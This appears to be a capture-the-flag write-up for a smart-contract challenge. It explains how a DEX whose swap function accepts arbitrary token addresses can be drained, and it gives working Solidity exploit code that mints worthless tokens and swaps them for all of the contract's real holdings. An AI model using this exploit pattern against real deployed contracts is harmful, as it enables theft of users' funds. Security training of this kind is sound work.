### Goals

Steal all tokens from the Dex contract.

### Exploit

We can swap arbitrary tokens using `DexTwo::swap()`. In order to drain tokens we would need to create tokens that we will transfer to the Dex in exchange of tokens it is holding.

We will need to provide Dex with 1 token so the below function will return whole balance.

```code
 function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }
```

### Code

Deploy contract in Remix

```code
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {DexTwo} from "./DexTwo.sol";

contract SampleERC20 is ERC20 {
    constructor(address _dexTwoInstance) ERC20("SampleERC20", "SERC20") {
        _mint(_dexTwoInstance, 1); // we need to topup Dex so getSwapAmount() does not return 0
        _mint(msg.sender, 1);
    }
}

contract DrainerTwo {
    DexTwo target;

    ERC20 a;
    ERC20 b;

    constructor(address _target) {
        target = DexTwo(_target);
        a = new SampleERC20(address(target));
        b = new SampleERC20(address(target));

        a.approve(address(target), 1);
        b.approve(address(target), 1);
    }

    function pwn() external {
        target.swap(address(a), target.token1(), 1);
        target.swap(address(b), target.token2(), 1);
    }
}
```

Deploy contract and call `pwn`

Done!
